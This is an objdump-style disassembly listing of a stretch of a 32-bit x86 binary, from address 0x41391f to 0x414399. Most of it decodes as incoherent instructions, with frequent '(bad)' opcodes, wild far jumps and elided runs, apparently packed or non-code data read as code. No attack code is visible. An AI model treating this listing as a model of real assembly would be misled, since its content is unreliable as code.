  41391f:	lahf   
  413920:	(bad)
  413924:	pinsrw mm5,WORD PTR [ebx-0x542d9d58],0x62
  41392c:	xor    ebx,DWORD PTR [eax-0x3da5cc22]
  413932:	add    al,0xb8
  413934:	mov    ch,0xc3
  413936:	fwait
  413937:	test   al,0x62
  413939:	mov    dl,0xd2
  41393b:	ins    BYTE PTR es:[edi],dx
  41393c:	cmp    esi,DWORD PTR [edx-0x7694f0fc]
  413942:	inc    esi
  413943:	push   es
  413944:	bound  eax,QWORD PTR ds:0x4528f5b
  41394a:	call   0x61f7:0x23d062e7
  413951:	add    BYTE PTR [ebx*2+0xc],0x0
	...
  41397d:	add    BYTE PTR [edx+eiz*8-0x2d8d9ed9],al
  413984:	ins    BYTE PTR es:[edi],dx
  413985:	push   esp
  413986:	jb     0x41398c
  413988:	iret   
  413989:	out    dx,al
  41398a:	arpl   WORD PTR [ebp+ecx*8-0x15],di
  41398e:	fcomp  QWORD PTR [edx-0x42]
  413991:	xchg   edi,eax
  413992:	imul   ecx,DWORD PTR [edi+esi*4],0x61
  413996:	dec    edx
  413997:	mov    ds,edi
  413999:	imul   eax,ecx,0xffffff9a
  41399c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399d:	popa   
  41399e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399f:	fimul  WORD PTR [ebx+0x2043259]
  4139a5:	add    al,0xb4
  4139a7:	inc    DWORD PTR [eax]
  4139a9:	ret    
  4139aa:	and    eax,DWORD PTR ds:0x4123c3d
  4139b0:	jg     0x413a13
  4139b2:	mov    BYTE PTR [ebx+0x0],dl
  4139b5:	add    DWORD PTR [ecx],0x976efd44
  4139bb:	fsubp  st(0),st
  4139bd:	pop    esi
  4139be:	jge    0x4139c5
  4139c0:	mov    WORD PTR [esp+ebx*2+0xd],fs
  4139c4:	(bad)  
  4139c5:	push   esi
  4139c6:	mov    al,0x7b
  4139c8:	adc    al,0xc3
  4139ca:	fiadd  WORD PTR [ebx]
  4139cc:	(bad)  
  4139cd:	jl     0x4139e7
  4139cf:	or     eax,0x8f3d3efe
  4139d4:	or     BYTE PTR [ecx-0x1f],al
  4139d7:	inc    ebx
  4139d8:	std    
  4139d9:	cs xchg edi,eax
  4139db:	fsubrp st(4),st
  4139dd:	push   ds
  4139de:	cmp    eax,0xe96b05
	...
  413a0b:	(bad)  
  413a0c:	xor    ch,BYTE PTR [edx-0x58]
  413a0f:	pop    ds
  413a10:	add    al,0xb4
  413a12:	xor    DWORD PTR [ebp+0x5],eax
  413a15:	inc    BYTE PTR [esi]
  413a17:	jae    0x413a74
  413a19:	call   0xfe4599ef
  413a1e:	pusha  
  413a1f:	mov    ds:0xfceef623,eax
  413a24:	(bad)  
  413a25:	cmp    DWORD PTR [ecx+0x39fe04d4],0xffffff80
  413a2c:	call   0xb1b4:0x420286a
  413a33:	les    eax,FWORD PTR [esi+edi*8]
  413a36:	(bad)  
  413a37:	jb     0x413a94
  413a39:	call   0xfe459a2f
  413a3e:	pusha  
  413a3f:	mov    ds:0xbcaef627,al
  413a44:	fdivr  DWORD PTR [ebx-0x1fb2b67]
  413a4a:	jmp    0x54c2aa9a
  413a4f:	mov    ebx,0x1f8efe0c
  413a54:	(bad)  
  413a55:	bound  eax,QWORD PTR [eax]
  413a57:	xchg   cl,ah
  413a59:	in     eax,0xf7
  413a5b:	xchg   edx,eax
  413a5c:	jnp    0x413a5b
  413a5e:	jae    0x413a8c
  413a60:	out    dx,eax
  413a61:	std    
  413a62:	inc    DWORD PTR [edx-0xa8a0144]
  413a68:	jbe    0x413adc
  413a6a:	cmp    DWORD PTR [edx+0x7b],edx
  413a6d:	(bad)  
  413a6e:	mov    ch,0x0
	...
  413a98:	inc    ebp
  413a99:	mov    ds:0x2952fffe,eax
  413a9e:	push   cs
  413a9f:	call   0x3e9fae
  413aa4:	adc    ch,cl
  413aa6:	jmp    0xfebc4da2
  413aab:	jne    0x413a92
  413aad:	jbe    0x413a67
  413aaf:	cmp    DWORD PTR [edx],eax
  413ab1:	jnp    0x413ab1
  413ab3:	mov    ch,0xd
  413ab5:	mov    ds:0x2912fffe,eax
  413aba:	push   cs
  413abb:	call   0x3ea01e
  413ac0:	and    ch,cl
  413ac2:	fincstp 
  413ac4:	xchg   edx,eax
  413ac5:	mov    ds:0xa319b5fe,al
  413aca:	(bad)  
  413acb:	push   DWORD PTR [edx+0x28]
  413ace:	push   cs
  413acf:	call   0x3e9aa2
  413ad4:	push   edx
  413ad5:	in     al,0xdd
  413ad7:	not    DWORD PTR [edx-0x5e]
  413ada:	(bad)  
  413adb:	jne    0x413b42
  413add:	jbe    0x413a67
  413adf:	cmp    DWORD PTR [edx-0x5e],esp
  413ae2:	cmp    BYTE PTR [ebp-0x1554b],0x35
  413ae9:	sub    ah,BYTE PTR [ecx]
  413aeb:	push   0xbeed5e34
  413af0:	and    BYTE PTR [esi+ecx*1],0xe8
  413af4:	xor    al,0x5f
  413af6:	std    
  413af7:	call   FWORD PTR [ecx+ebp*8]
  413afa:	xchg   edi,eax
  413afb:	iret   
	...
  413b24:	add    BYTE PTR [ebx],ch
  413b26:	rcr    DWORD PTR [ebp-0x2],1
  413b29:	rcr    edi,1
  413b2b:	push   ebp
  413b2c:	(bad)  
  413b2d:	adc    eax,DWORD PTR [ecx-0x3b0bf029]
  413b33:	sbb    al,0xff
  413b35:	add    esi,DWORD PTR [ecx-0x29]
  413b38:	psubq  mm3,mm6
  413b3b:	cmp    al,0xf6
  413b3d:	repz mov al,ds:0x9c14745d
  413b43:	sub    al,0xfe
  413b45:	jecxz  0x413ad7
  413b47:	pop    ebp
  413b48:	mov    ah,0xf4
  413b4a:	inc    eax
  413b4b:	pop    ebp
  413b4c:	inc    ah
  413b4e:	add    ebx,DWORD PTR [esi]
  413b50:	dec    ebx
  413b52:	dec    eax
  413b53:	xchg   edi,eax
  413b54:	out    dx,eax
  413b55:	retf   
  413b56:	xor    BYTE PTR [ebp-0x19],bl
  413b59:	add    eax,edi
  413b5b:	pop    esi
  413b5c:	(bad)  
  413b5d:	mov    bl,0xa6
  413b5f:	jo     0x413b57
  413b61:	stos   DWORD PTR es:[edi],eax
  413b62:	push   0x50e0196c
  413b67:	pop    ebp
  413b68:	(bad)  
  413b69:	shr    DWORD PTR [ebx+0x55],1
  413b6c:	(bad)  
  413b6d:	xchg   ebx,eax
  413b6e:	imul   ecx,DWORD PTR ds:0x5f088b3c,0xffffffb4
  413b75:	js     0x413b7f
  413b77:	pop    edi
  413b78:	inc    BYTE PTR [edi+ebp*8+0x2073ff1d]
  413b7f:	cdq    
  413b80:	fbstp  TBYTE PTR [ebx+0x28]
  413b83:	pop    edi
  413b84:	out    0x65,eax
  413b86:	ins    BYTE PTR es:[edi],dx
  413b87:	pop    ebp
  413b88:	inc    BYTE PTR [eax]
	...
  413bb2:	pop    ebx
  413bb3:	jle    0x413bea
  413bb5:	not    BYTE PTR [ebx-0x40]
  413bb8:	imul   ebp,ebp,0xfe5ec907
  413bbe:	fxch   st(3)
  413bc0:	ins    BYTE PTR es:[edi],dx
  413bc1:	stc    
  413bc2:	cmp    DWORD PTR [edx-0x5a],ebx
  413bc5:	pop    esi
  413bc6:	xor    al,BYTE PTR [edi+0x33156b9b]
  413bcc:	out    0x3,eax
  413bce:	push   ebp
  413bcf:	sbb    al,0xdc
  413bd1:	add    esi,DWORD PTR [ecx-0x2c]
  413bd4:	xchg   ebx,eax
  413bd5:	sbb    bh,0xff
  413bd8:	adc    DWORD PTR [esi+esi*2],eax
  413bdb:	mov    ?,WORD PTR [esi-0x28]
  413bde:	sbb    esi,ebx
  413be0:	out    0x1c,eax
  413be2:	sti    
  413be3:	add    BYTE PTR [ecx-0x38],dh
  413be6:	test   DWORD PTR [eax],0xcc740bd5
  413bec:	rol    ah,0xe3
  413bef:	add    DWORD PTR ds:0xe79a6365,edx
  413bf5:	imul   esi,DWORD PTR [edx-0x35a1c102],0xffffff86
  413bfc:	fucomip st,st(3)
  413bfe:	mov    ?,WORD PTR [edx-0x58]
  413c01:	add    eax,DWORD PTR [ebp+ebx*2-0x19]
  413c05:	add    ebx,DWORD PTR [ebx+esi*8+0xaa606c]
  413c0c:	pop    ss
  413c0d:	fsub   DWORD PTR [edi-0x7bf46b00]
  413c13:	ins    BYTE PTR es:[edi],dx
  413c14:	rcr    BYTE PTR [esi+0x0],0x0
	...
  413c3c:	add    BYTE PTR [eax],al
  413c3e:	add    BYTE PTR [edx+0x1c072a12],dl
  413c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c45:	bound  ebp,QWORD PTR [edi-0x62]
  413c48:	pop    ss
  413c49:	in     al,dx
  413c4a:	mov    ah,0xd2
  413c4c:	je     0x413c35
  413c4e:	jmp    0xc963c34
  413c53:	je     0x413c1b
  413c55:	minps  xmm4,XMMWORD PTR [edx-0x2e]
  413c59:	and    al,0x60
  413c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c5c:	inc    esi
  413c5d:	dec    esp
  413c5e:	int3   
  413c5f:	fcomp  QWORD PTR [edx+0x72]
  413c62:	pop    ds
  413c63:	mov    ch,0x92
  413c65:	add    BYTE PTR [eax],ch
  413c67:	sbb    bl,bl
  413c69:	cmp    eax,0x689753e9
  413c6e:	aaa    
  413c6f:	inc    esi
  413c70:	fwait
  413c71:	add    BYTE PTR [esi],dh
  413c73:	mov    eax,0x1fe92629
  413c78:	push   esp
  413c79:	rcl    BYTE PTR ds:0xcfe8a619,0xda
  413c80:	add    dh,bh
  413c82:	sbb    eax,edi
  413c84:	(bad)  
  413c85:	std    
  413c86:	xchg   BYTE PTR [edx-0x20fcaa89],ah
  413c8c:	dec    DWORD PTR [ebp+0x66]
  413c8f:	retf   
  413c90:	push   edi
  413c91:	call   0xfe4230b1
  413c96:	inc    ecx
  413c97:	add    eax,0x454efd44
  413c9c:	pop    ebx
  413c9d:	inc    esi
  413c9e:	imul   esi,DWORD PTR [edx],0x43735b
	...
  413ccc:	loop   0x413cd1
  413cce:	xor    ch,BYTE PTR [ecx]
  413cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd1:	add    dh,bh
  413cd3:	cs pop ecx
  413cd5:	or     ch,BYTE PTR [edi-0x4679e71f]
  413cdb:	push   ds
  413cdc:	rol    DWORD PTR [ebx],cl
  413cde:	(bad)  
  413cdf:	pushf  
  413ce0:	pop    ss
  413ce1:	repz xchg ebp,eax
  413ce3:	sar    eax,1
  413ce5:	add    BYTE PTR [esi-0x59],bl
  413ce8:	out    0x19,al
  413cea:	add    eax,0xecd4d2e9
  413cef:	push   0xffffffd4
  413cf1:	add    ebp,DWORD PTR [ebx-0x17]
  413cf4:	test   DWORD PTR [eax-0xcdfa303],edx
  413cfa:	aaa    
  413cfb:	and    ecx,ecx
  413cfd:	add    BYTE PTR [eax+0x71fc2c],cl
  413d03:	inc    ecx
  413d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d05:	jno    0x413d46
  413d07:	add    BYTE PTR [ebp-0xd],al
  413d0a:	popa   
  413d0b:	push   0xfffffff4
  413d0d:	push   esi
  413d0e:	std    
  413d0f:	xor    eax,0x411354
  413d14:	pop    ebp
  413d15:	sahf   
  413d16:	cmp    al,0xff
  413d18:	jp     0x413d6c
  413d1a:	shl    BYTE PTR [esp+ebx*1-0x39],0x65
  413d1f:	add    BYTE PTR ds:0x9068bb6e,dh
  413d25:	hlt    
  413d26:	inc    eax
  413d27:	add    BYTE PTR ds:0xad0874a0,dh
  413d2d:	cdq    
  413d2e:	(bad)  
  413d2f:	inc    DWORD PTR [eax]
	...
  413d59:	mov    dh,BYTE PTR [edx-0x39]
  413d5c:	cmp    cl,BYTE PTR [edx+0x500659f]
  413d62:	jo     0x413d1f
  413d64:	push   0x40f470
  413d69:	(bad)  
  413d6b:	addr16 inc ecx
  413d6d:	lds    ebx,FWORD PTR [edi-0x5592f78c]
  413d73:	(bad)  
  413d74:	dec    DWORD PTR [edx]
  413d76:	lahf   
  413d77:	je     0x413d75
  413d79:	or     ah,BYTE PTR ds:0x5f23e806
  413d7f:	std    
  413d80:	(bad)  
  413d81:	in     al,dx
  413d82:	fwait
  413d83:	add    DWORD PTR [eax],eax
  413d85:	jo     0x413d5a
  413d87:	jmp    0x53df2f0f
  413d8c:	push   edi
  413d8d:	lahf   
  413d8e:	pop    edx
  413d8f:	push   0x50
  413d91:	sbb    ah,BYTE PTR ds:0x674de806
  413d97:	std    
  413d98:	(bad)  
  413d99:	cld    
  413d9a:	adc    al,0xfa
  413d9c:	mov    esi,DWORD PTR [eax-0x7abeba0b]
  413da2:	int    0x3c
  413da4:	imul   ebp,DWORD PTR ds:0x1c7ffe18,0xe1740465
  413dae:	fwait
  413daf:	mov    al,ds:0xb2f3dd69
  413db4:	out    0x41,eax
  413db6:	push   esi
  413db7:	add    al,0x0
  413db9:	pop    ss
  413dba:	mov    ah,0xd0
  413dbc:	push   ds
	...
  413de5:	add    dl,dl
  413de7:	sbb    ebx,DWORD PTR [esp+eax*2]
  413dea:	xor    esi,DWORD PTR [ebp-0xbe3984c]
  413df0:	push   0xffffffbd
  413df2:	mov    ah,0x95
  413df4:	out    dx,al
  413df5:	inc    eax
  413df6:	sbb    al,0x44
  413df8:	pop    ecx
  413df9:	je     0x413e1f
  413dfb:	in     al,dx
  413dfc:	mov    edi,0x6c7d0b62
  413e01:	dec    ebp
  413e02:	inc    esi
  413e03:	test   DWORD PTR [ecx-0x16],ebx
  413e06:	sbb    eax,0x1c3d8436
  413e0b:	pop    ds
  413e0c:	pop    esp
  413e0d:	inc    ebp
  413e0e:	call   0xe3f98273
  413e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e14:	pop    ecx
  413e15:	dec    dh
  413e17:	jge    0x413e35
  413e19:	pop    es
  413e1a:	dec    ecx
  413e1b:	fstp   DWORD PTR [ecx+0x74]
  413e1e:	enter  0xcf3c,0x7
  413e22:	mov    ah,0xd9
  413e24:	adc    edi,edi
  413e26:	mov    ebx,0xdec8b7cc
  413e2b:	out    dx,eax
  413e2c:	add    DWORD PTR [ebp-0x69],edx
  413e2f:	dec    edi
  413e30:	test   ebx,eax
  413e32:	mov    al,ds:0x1c69b2bd
  413e37:	fidiv  DWORD PTR [esi+edi*8+0x496a0c09]
  413e3e:	push   ebx
  413e3f:	std    
  413e40:	pop    edx
  413e41:	mov    cl,bl
  413e43:	pop    es
  413e44:	(bad)  
  413e45:	xor    al,0x1
  413e47:	mov    esp,0xffc4
	...
  413e70:	add    BYTE PTR [eax],al
  413e72:	add    BYTE PTR [esi-0x1c12dba6],ah
  413e78:	fwait
  413e79:	out    0x83,eax
  413e7b:	and    bl,BYTE PTR [ebx+0x5b]
  413e7e:	rol    ebx,0xc0
  413e81:	inc    ecx
  413e82:	lds    edx,FWORD PTR [ebx-0x5c]
  413e85:	iret   
  413e86:	loop   0x413e89
  413e88:	pop    ebx
  413e89:	out    0xe,eax
  413e8b:	pop    esp
  413e8c:	xchg   dh,dl
  413e8e:	mov    cl,0x43
  413e90:	shr    DWORD PTR [edx],0x5b
  413e93:	xor    ch,BYTE PTR [edx-0x11e3fbf1]
  413e99:	pop    ebp
  413e9a:	jmp    0x413ef3
  413e9c:	jo     0x413ec6
  413e9e:	add    al,0x6c
  413ea0:	cld    
  413ea1:	adc    al,0xc
  413ea3:	add    al,0x15
  413ea5:	or     bl,BYTE PTR [ebx+0xa]
  413ea8:	hlt    
  413ea9:	xchg   edi,eax
  413eaa:	sbb    al,0x3
  413eac:	std    
  413ead:	add    BYTE PTR [edx+eiz*2],0xdb
  413eb1:	lods   eax,DWORD PTR ds:[esi]
  413eb2:	add    ebp,DWORD PTR [ecx+0x1]
  413eb5:	scas   al,BYTE PTR es:[edi]
  413eb6:	push   edi
  413eb7:	sbb    esp,DWORD PTR cs:[ecx+0x56fce25a]
  413ebe:	push   ebp
  413ebf:	mov    DWORD PTR [ebx-0x1a],eax
  413ec2:	rcl    BYTE PTR [esi-0x35a84304],1
  413ec8:	xchg   bh,ch
  413eca:	imul   esi,edi,0x43
  413ecd:	ss pop edx
  413ecf:	pop    edx
  413ed0:	popf   
  413ed1:	and    BYTE PTR [ebp+0x1f],al
  413ed4:	pop    ebx
  413ed5:	mov    esp,0x8e
	...
  413efe:	add    BYTE PTR [eax],al
  413f00:	mov    bh,0xd8
  413f02:	and    edx,DWORD PTR [edi+0x35]
  413f05:	pop    ebx
  413f06:	xor    DWORD PTR [ebp+0x6bdf869a],0x5a064561
  413f10:	xchg   esp,eax
  413f11:	xchg   esi,eax
  413f12:	sti    
  413f13:	jmp    0xfc1f:0xa800716a
  413f1a:	jae    0x413efd
  413f1c:	pop    es
  413f1d:	mov    fs,eax
  413f1f:	out    0xc5,al
  413f21:	cld    
  413f22:	jae    0x413f01
  413f24:	lds    eax,FWORD PTR [esi+0x45f7c108]
  413f2a:	std    
  413f2b:	into   
  413f2c:	out    0x19,eax
  413f2e:	add    eax,0xecd17ae9
  413f33:	push   0xffffffdc
  413f35:	sbb    edx,DWORD PTR [edi-0x4a]
  413f38:	imul   edx,DWORD PTR [eax-0x18],0x24
  413f3c:	push   ss
  413f3d:	cld    
  413f3e:	std    
  413f3f:	repnz fild WORD PTR [esi+0x19d73f03]
  413f46:	or     ecx,ebp
  413f48:	mov    ds:0x7539f096,al
  413f4d:	xchg   DWORD PTR [ecx+edx*4],ecx
  413f50:	ins    DWORD PTR es:[edi],dx
  413f51:	ds std 
  413f53:	jle    0x413f66
  413f55:	sbb    ecx,DWORD PTR [esi]
  413f57:	ins    DWORD PTR es:[edi],dx
  413f58:	sub    BYTE PTR [edx+0x0],bl
  413f5b:	jmp    0x523dc6b4
  413f60:	stos   BYTE PTR es:[edi],al
  413f61:	inc    edx
  413f62:	std    
  413f63:	pop    esi
	...
  413f8c:	add    BYTE PTR [edi-0x14a9136a],dl
  413f92:	(bad)  
  413f93:	std    
  413f94:	aam    0x3b
  413f96:	std    
  413f97:	jae    0x413fda
  413f99:	cmp    BYTE PTR [edi+esi*1+0x3e],bh
  413f9d:	shl    DWORD PTR gs:[ebx+0x45],1
  413fa1:	inc    edi
  413fa2:	lods   al,BYTE PTR ds:[esi]
  413fa3:	add    cl,ch
  413fa5:	pop    ds
  413fa6:	jae    0x41400e
  413fa8:	xchg   edx,eax
  413fa9:	fdivp  st(3),st
  413fab:	push   ebx
  413fac:	adc    DWORD PTR [ebx+0x28e90036],eax
  413fb2:	sbb    esi,DWORD PTR [esp+eiz*8+0x6]
  413fb6:	mov    bh,0x0
  413fb8:	add    BYTE PTR [ebp+0x57],dh
  413fbb:	mov    eax,esi
  413fbd:	lods   eax,DWORD PTR ds:[esi]
  413fbe:	stc    
  413fbf:	push   0x41
  413fc1:	test   DWORD PTR [edi-0x23],ebp
  413fc4:	and    eax,DWORD PTR [ebp-0x130ffea9]
  413fca:	or     al,0xe6
  413fcc:	push   0x40edd3
  413fd1:	sbb    ebp,DWORD PTR [edi+0x7d]
  413fd4:	and    eax,0xc0095745
  413fd9:	or     ah,bh
  413fdb:	call   0x987560
  413fe0:	mov    dl,BYTE PTR [ebp-0x67]
  413fe3:	std    
  413fe4:	call   DWORD PTR ds:0x8d75fec5
  413fea:	outs   dx,DWORD PTR ds:[esi]
  413feb:	mov    ch,0x23
  413fed:	xor    eax,0xc00957
	...
  41401a:	cmp    edi,edi
  41401c:	mov    BYTE PTR [ebp-0x67],al
  41401f:	xchg   ebx,eax
  414020:	je     0x41400a
  414022:	lods   eax,DWORD PTR ds:[esi]
  414023:	imul   eax,DWORD PTR [ebp-0x1],0xffffff82
  414027:	in     eax,0x44
  414029:	loopne 0x41409d
  41402b:	sub    edx,esp
  41402d:	(bad)  
  41402e:	call   0xacbb25b1
  414033:	xchg   ebx,eax
  414034:	dec    BYTE PTR [ebx]
  414036:	xor    eax,0xe0d13b2a
  41403b:	call   0x50e1:0xb9700067
  414042:	bound  ebp,QWORD PTR [ecx]
  414044:	fsubp  st(0),st
  414046:	adc    BYTE PTR [ecx],al
  414048:	(bad)  
  414049:	(bad)  
  41404a:	mov    esi,0xdd26719e
  41404f:	pop    ebp
  414050:	add    bh,ch
  414052:	inc    ebx
  414053:	xchg   ebx,eax
  414054:	je     0x41405e
  414056:	or     eax,0x1cff34ae
  41405b:	push   ecx
  41405c:	pop    eax
  41405d:	je     0x413fe3
  41405f:	imul   ecx,esi,0xea97407
  414065:	inc    DWORD PTR [ebx+0x7be3cbf9]
  41406b:	ja     0x4140ce
  41406d:	(bad)  
  41406e:	jmp    0x31adaa6e
  414073:	add    DWORD PTR [esi-0x2],edx
  414076:	jmp    0x14bead9e
  41407b:	adc    DWORD PTR [esi+0x59],edx
	...
  4140a6:	add    ah,dh
  4140a8:	jnp    0x41409e
  4140aa:	jg     0x4140b6
  4140ac:	add    al,0x7
  4140ae:	test   ebx,ebx
  4140b0:	mov    eax,0x5c4fe55
  4140b5:	add    ch,bh
  4140b7:	jb     0x414082
  4140b9:	iret   
  4140ba:	pop    es
  4140bb:	xor    al,0xf7
  4140bd:	adc    bh,bh
  4140bf:	and    ebx,ecx
  4140c1:	iret   
  4140c2:	sti    
  4140c3:	sbb    edx,DWORD PTR [edi+0x68]
  4140c6:	dec    BYTE PTR [ecx+0x513c69fc]
  4140cc:	loope  0x414123
  4140ce:	dec    BYTE PTR [ecx+0x344d6ce8]
  4140d4:	jno    0x41412b
  4140d6:	mov    WORD PTR [ecx+0x74],ds
  4140d9:	mov    ah,0xe7
  4140db:	imul   eax,DWORD PTR [edx+0x55],0xb403f7fe
  4140e2:	enter  0xfbde,0x1
  4140e6:	push   ebp
  4140e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140e8:	aaa    
  4140e9:	add    ebx,0xfbbf6ec0
  4140ef:	ins    BYTE PTR es:[edi],dx
  4140f0:	cmp    edi,ecx
  4140f2:	or     edi,DWORD PTR [ebx+0x57e809b6]
  4140f8:	pusha  
  4140f9:	add    al,0x0
  4140fb:	pop    ss
  4140fc:	pop    ebx
  4140fd:	daa    
  4140fe:	pop    es
  4140ff:	cdq    
  414100:	inc    edx
  414101:	call   0xe7c65d09
  414106:	jmp    0x4140e5
  414108:	test   DWORD PTR [eax+0x3],ebp
	...
  414132:	add    BYTE PTR [eax],al
  414134:	mov    ebp,DWORD PTR [edi-0xd]
  414137:	push   esi
  414138:	or     BYTE PTR [ebx+0xf],ah
  41413b:	pop    ds
  41413c:	aaa    
  41413d:	cli    
  41413e:	test   BYTE PTR [eax+ebx*8-0xbfc7e0e],0xa1
  414146:	push   edx
  414147:	lds    esp,FWORD PTR [ebx-0x8]
  41414a:	push   esp
  41414b:	or     BYTE PTR [ebx+0x6f],bl
  41414e:	fild   QWORD PTR [ebx+0x2d]
  414151:	ss into 
  414153:	push   esi
  414154:	xchg   esp,eax
  414155:	lahf   
  414156:	mov    ebx,0x17fed888
  41415b:	in     al,dx
  41415c:	jmp    0x334569e6
  414161:	outs   dx,DWORD PTR ds:[esi]
  414162:	fist   DWORD PTR [esi-0x50]
  414165:	bound  ecx,QWORD PTR [edi-0x61061aa6]
  41416b:	mov    WORD PTR [eax-0x15],fs
  41416e:	add    DWORD PTR [esp+eax*4],eax
  414171:	mov    es,WORD PTR [edx]
  414173:	lds    ecx,FWORD PTR [ebx]
  414175:	cli    
  414176:	cld    
  414177:	pop    es
  414178:	add    ebp,DWORD PTR [edi-0x11]
  41417b:	imul   eax,DWORD PTR [ecx],0x36
  41417e:	jbe    0x4141d6
  414180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414181:	sahf   
  414182:	jnp    0x41416d
  414184:	jmp    0x414106
  414186:	shr    edx,0x5c
  414189:	pop    ebx
  41418a:	pop    esi
  41418b:	shl    BYTE PTR [edi],1
  41418d:	clc    
  41418e:	fmul   QWORD PTR [ebx]
  414190:	les    ecx,FWORD PTR [edx]
  414192:	adc    dl,BYTE PTR [edi-0x36]
  414195:	loop   0x414143
  414197:	imul   eax,DWORD PTR [eax],0x0
	...
  4141be:	add    BYTE PTR [eax],al
  4141c0:	add    BYTE PTR [esi+0x2b033776],bl
  4141c6:	fild   WORD PTR [eax]
  4141c8:	push   0x1f
  4141ca:	pop    ebx
  4141cb:	add    BYTE PTR [edx-0x3c],ch
  4141ce:	cld    
  4141cf:	add    BYTE PTR [ebp+0x573f9c4],bl
  4141d5:	repnz outs dx,BYTE PTR ds:[esi]
  4141d7:	lock add DWORD PTR [edx-0x60],ebx
  4141db:	std    
  4141dc:	push   cs
  4141dd:	push   ss
  4141de:	sbb    esi,DWORD PTR [ebp-0x69]
  4141e1:	dec    eax
  4141e2:	xchg   esp,esp
  4141e4:	xchg   ebx,eax
  4141e5:	pop    ds
  4141e6:	out    0x43,al
  4141e8:	or     eax,0xf973f9af
  4141ed:	neg    BYTE PTR [edi+ebx*2-0x1a]
  4141f1:	leave  
  4141f2:	rcl    BYTE PTR fs:[ebp-0x69],0xdd
  4141f7:	jnp    0x4141ca
  4141f9:	sbb    BYTE PTR [edi+0x51],ch
  4141fc:	push   0x73
  4141fe:	in     al,dx
  4141ff:	add    BYTE PTR ds:0xb97bdd5b,bh
  414205:	and    BYTE PTR [edi+0x45],ch
  414208:	inc    ecx
  414209:	sbb    BYTE PTR [ebx-0x13],bl
  41420c:	outs   dx,DWORD PTR ds:[esi]
  41420d:	shr    DWORD PTR [esi+0x10],1
  414210:	xchg   ecx,eax
  414211:	sub    al,0x2c
  414213:	std    
  414214:	sahf   
  414215:	jno    0x414286
  414217:	clc    
  414218:	xchg   esi,eax
  414219:	jecxz  0x414282
  41421b:	call   0xfe396e22
  414220:	xchg   bl,dl
  414222:	jmp    0x414221
  414224:	hlt    
	...
  41424d:	add    bh,ch
  41424f:	jmp    DWORD PTR [eax-0x43]
  414252:	dec    eax
  414253:	stc    
  414254:	std    
  414255:	hlt    
  414256:	dec    ebx
  414257:	stc    
  414258:	jae    0x4142b3
  41425a:	dec    ecx
  41425b:	outs   dx,DWORD PTR ds:[esi]
  41425c:	adc    BYTE PTR [ecx+0x3a],dl
  41425f:	das    
  414260:	std    
  414261:	push   esi
  414262:	imul   ebp,DWORD PTR [edi-0x14],0xe867db4e
  414269:	add    BYTE PTR [edx+0x67],dh
  41426c:	std    
  41426d:	(bad)  
  41426e:	cli    
  41426f:	daa    
  414270:	out    0xff,al
  414272:	jo     0x41425f
  414274:	in     eax,0x3c
  414276:	mov    cl,0x8e
  414278:	(bad)  
  414279:	inc    DWORD PTR [eax+0x7221e593]
  41427f:	mov    ?,esi
  414281:	push   DWORD PTR [eax+0x7219e5a7]
  414287:	mov    ?,esi
  414289:	inc    DWORD PTR [eax]
  41428b:	mov    ebp,fs
  41428d:	adc    DWORD PTR [edx-0xf000172],esi
  414293:	jg     0x41427a
  414295:	or     DWORD PTR [edx-0x3f000172],esi
  41429b:	xchg   ch,ah
  41429d:	add    DWORD PTR [edx],esi
  41429f:	mov    ?,esi
  4142a1:	push   eax
  4142a3:	xchg   edx,eax
  4142a4:	in     eax,0x25
  4142a6:	push   ss
  4142a7:	pop    edi
  4142a8:	add    cl,cl
  4142aa:	ja     0x41430b
  4142ac:	add    BYTE PTR [ebp-0x52],dl
  4142af:	jg     0x414231
  4142b1:	les    eax,FWORD PTR [eax]
	...
  4142db:	pop    ebp
  4142dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142dd:	(bad)  
  4142de:	dec    eax
  4142e0:	mov    eax,0x287a50f9
  4142e5:	or     bh,bh
  4142e7:	xor    BYTE PTR [edi-0x18],ah
  4142ea:	(bad)  
  4142ec:	pop    edx
  4142ed:	add    BYTE PTR [ebx],cl
  4142ef:	mov    ch,0x5f
  4142f1:	and    DWORD PTR [ebp-0x38ffa50b],0x40
  4142f8:	xchg   edi,eax
  4142f9:	std    
  4142fa:	inc    DWORD PTR ds:0x7145c55b
  414300:	pop    DWORD PTR [esi]
  414302:	add    ch,dh
  414304:	add    al,0xfe
  414306:	imul   eax,ebp,0x1cec84dd
  41430c:	xchg   ebp,eax
  41430d:	push   esp
  41430e:	(bad)  
  41430f:	ins    BYTE PTR es:[edi],dx
  414310:	sbb    al,BYTE PTR [edx]
  414312:	lea    ebx,[ecx+0x38]
  414315:	mov    cl,0x8c
  414317:	mov    eax,ds:0xb3fe4c30
  41431c:	aam    0x54
  41431e:	je     0x4142c4
  414320:	inc    ebp
  414321:	into   
  414322:	sti    
  414323:	mov    ah,0x3a
  414325:	pop    ds
  414326:	add    BYTE PTR [ecx+ebp*8],bl
  414329:	inc    ecx
  41432a:	jae    0x41434a
  41432c:	pop    ecx
  41432d:	fild   DWORD PTR [edx-0x1b60737]
  414333:	add    DWORD PTR [ebx],0xffffffce
  414336:	add    al,0x7b
  414338:	mov    edi,0x7f5eea59
  41433d:	jle    0x414326
	...
  414367:	add    BYTE PTR [ebx+0x5],dh
  41436a:	push   edx
  41436b:	dec    edi
  41436c:	xchg   ecx,eax
  41436d:	xchg   DWORD PTR [eax-0xa],ebx
  414370:	pop    ebx
  414371:	adc    eax,0xffc9feb5
  414376:	push   edx
  414377:	je     0x41438d
  414379:	sbb    al,0x82
  41437b:	cmp    BYTE PTR [ebx+0x1d],al
  41437e:	(bad)  
  41437f:	mov    edi,0x847cf0b0
  414384:	sub    al,0xb5
  414386:	push   ecx
  414387:	(bad)  
  414388:	mov    ah,0xa2
  41438a:	fld    QWORD PTR [eax+0x1c]
  41438d:	mov    ebp,0xd513ef97
  414392:	push   ecx
  414393:	out    0xed,eax
  414395:	and    DWORD PTR [edx],eax
  414397:	add    BYTE PTR [edi],dl
  414399:	(bad)  
